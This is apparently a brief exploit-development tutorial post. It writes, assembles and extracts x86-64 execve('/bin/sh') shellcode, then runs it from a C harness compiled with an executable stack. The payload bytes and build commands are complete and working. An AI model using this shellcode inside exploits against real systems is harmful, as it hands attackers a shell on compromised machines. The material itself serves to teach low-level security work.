---
title: Develop Shellcode
layout: post
---

---
```zsh
➜  ~  cat shellcode.asm
```
```nasm
section .text
	global _start
_start:
	jmp shell
here:
	xor rax,rax
	pop rdi
	xor rsi,rsi
	xor rdx,rdx
	add rax,59
	syscall
shell:
	call here
bash db "/bin//sh"
```
```zsh
➜  ~  nasm -f elf64 shellcode.asm -o shellcode.o
➜  ~  ld shellcode.o -o shellcode
➜  ~  file shellcode
shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
➜  ~  for i in $(objdump -d shellcode -M intel | grep "^ " | cut -f2); do echo -n '\x'$i; done;echo
\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68
```
```c++
#include <stdio.h>
unsigned char shellcode[] = "\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
int main() { int (*ret)() = (int(*)())shellcode; ret();}
```
```zsh
➜  ~  gcc shellcode.c -z execstack -o c_shellcode
➜  ~  ./shellcode
# 
```
---
# Author <a href=" https://twitter.com/SectionText">SectionText</a> 
---